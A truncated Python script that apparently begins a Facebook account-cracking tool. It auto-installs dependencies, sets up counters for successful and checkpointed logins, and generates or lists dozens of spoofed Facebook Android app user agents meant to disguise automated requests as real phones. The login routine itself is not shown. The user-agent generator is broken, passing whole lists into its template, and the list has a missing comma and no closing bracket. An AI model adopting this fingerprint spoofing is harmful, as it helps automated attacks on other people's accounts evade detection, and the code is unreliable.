#-----------------------❲ IMPORT ❳-----------------------#
import os,zlib
from os import system as osRUB
from os import system as cmd
#-----------------------❲ MISSING MODELS ❳-----------------------#
try:
    import requests 
except ImportError:
    print('❲•❳ INSTALLING REQUESTS');os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('❲•❳  INSTALLING FUTURES ');os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
#-----------------------❲ MODELS ❳-----------------------#
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as SHUVOxd
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#-----------------------❲ LOOP ❳-----------------------#
totaldmp = 0;count = 0;loop = 0;oks = [];cps = [];id = [];ps = [];sid = [];total=[];methods = [];srange = 0;saved = [];totaldmp = 0;filter = [];user=[]
#-----------------------❲ GRAPH & API USER AGENT ❳-----------------------#
import random

def generate_random_user_agent():
    user_agent_template = (
        '[FBAN/FB4A;FBAV/{version};FBBV/{version_code};FBDM/{device_density};FBLC/{language};FBRV/{revision};'
        'FBCR/{carrier};FBMF/{manufacturer};FBBD/{brand};FBPN/{package};FBDV/{device};FBSV/{os_version};'
        'FBOP/{op};FBCA/{cpu_architecture};SIM/{sim_name};MODEL/{model_name};]')

    version = f"{random.randint(100, 259)}.0.0.{random.randint(10, 99)}"
    version_code = random.randint(10000000, 99999999,)
    device_density = f"{random.choice(['3.0', '1.75', '2.0', '2.625', '3.5', '1.5', '4.0'])}"
 # Example: Set to a specific language code  
    language = ["en_US", "fr_FR", "th_TH", "es_MX", "en_EG", "en_PH", "hu_HU", "vi_VN", "en_GB", "en_ZA", "tr_TR"]
  # Example: Set revision number if applicable
    revision = "190301973"
   # Example: Set carrier name
    carrier = "PosteMobile","O2-CZ","airtel","Beeline","MegaFon","T-Mobile","Tele2 LT","Three","Beeline","MegaFon"

    manufacturer = "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"
    brand = ["samsung", "zte", "Xiaomi", "OPPO"]
    package = "com.facebook.katana"
    device = ("GT-I9505", "Hisense-Hi-3", "SM-A515F", "ATU-L31", "HUAWEI LUA-L21", "Lenovo A6020a46", "FIG-LX1", "Kirin Treble", 
       "SM-S111DL", "SM-J410", "YAL-L21", "925F", "SM-G930F", "SM-J210F", "SM-A720F", "Z987", "MI 5X", "SM-G950U",
       "SM-G925F", "SM-N9005", "CPH1909", "SM-A205GN", "SM-A505GN", "AGS2-L09", "LML713DL", "LML414DL", "CPH1987", 
       "Hisense Hi 3", "LM-V405", "vivo V3Max", "POT-LX1", "SM-N975U", "SM-N960F", "A37f", "moto e6", "SM-G955F", 
       "DRA-LX2", "E6653", "GT-I9300")
    os_version = '5.0.1', '8.0.0', '9.0.1', '4.4.4', '8.1.0', '5.1.1', '7.1.2', '9', '7.0', '10', '7.1.1', '4.0.4'
    op = 20
    cpu_architecture = "x86:armeabi-v7a"

    # Randomly select SIM name and model name
    sim_name = random.choice([
        "Banglalink", "Robi", "MTN-CG", "Grameenphone", "Artel", "Teletalk", "UMobaile", "Digi",
        "Bouygues Telecom", "MegaFon", "Viettel Telecom", "TM", "GLOBE", "TELCEL", "TelkomSA",
        "U.S. Cellular", "null", "VIETTEL", "Verizon", "O2-CZ", "Metro by T-Mobile", "SUN"])
    model_name = random.choice([
        "SM-G3518","SM-J320F","ASUS_Z016D","ATU-L31","SM-J530F","2499", "POCOPHONE F1", "CPH2083", "Xiaomi_Mi_Mix_10", "Redmi Note 7 Pro", "CPH2185", "CPH2065",
        "CPH2197", "CPH1989", "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 8A", "MI PLAY", "OPPO A57", "CPH2145",
        "Mi Note 10 Lite", "MI PAD 4", "F1w", "Redmi 5 Plus", "CPH1909", "CPH2065", "CPH1937", "CPH2249",
        "CPH2095", "CPH2083", "CPH1979", "CPH2067", "CPH2015", "CPH2021", "CPH2205", "CPH2207", "CPH1909",
        "CPH1801", "CPH1911", "CPH1901", "CPH1727", "1201", "Xiaomi"])
    return user_agent_template.format(
        version=version,
        version_code=version_code,
        device_density=device_density,
        language=language,
        revision=revision,
        carrier=carrier,
        manufacturer=manufacturer,
        brand=brand,
        package=package,
        device=device,
        os_version=os_version,
        op=op,
        cpu_architecture=cpu_architecture,
        sim_name=sim_name,
        model_name=model_name)

predefined_user_agents = [
   "Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]",
   "Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]",
   "Dalvik/2.1.0 (Linux, U; Android 7.0, Hisense Hi 3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 2391017119 FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1;]",
   "Dalvik/2.1.0 (Linux, U; Android 7.0, HisenseHi3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 239.10.17.119,FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920):FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]",
   "Dalvik/2.1.0 9Linux;U; Android 5.1.1; A37f Build/LMY47V( [FBAN/EMA;UNITY_PACKAGE/1315;FBBV/203779460;FBAV/190.0.0.6.117;FBDV/A37F;FBLC/en_US;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
   "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]",
   "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]",
   "Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; W-K200 Build/O11019) [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/234444154;FBAV/209.0.0.5.119;FBDV/W-K200;FBLC/vi_VN;FBOP/20;FBNG/3G;FBCQ/UNKNOWN;FBMNT/METERED]",
   "Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X00QD Build/PPR1.180610.009) [FBAN/EMA;UNITY_PACKAGE/1634;FBBV/244867833;FBAV/216.0.0.10.121;FBDV/ASUS_X00QD;FBLC/pt_BR;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;]"
   "Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/269.0.0.15.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/221129137;FBCR/Movistar;FBMF/ZTE;FBBD/ZTE;FBDV/ZTE Blade A5 2019;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]",
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;]",
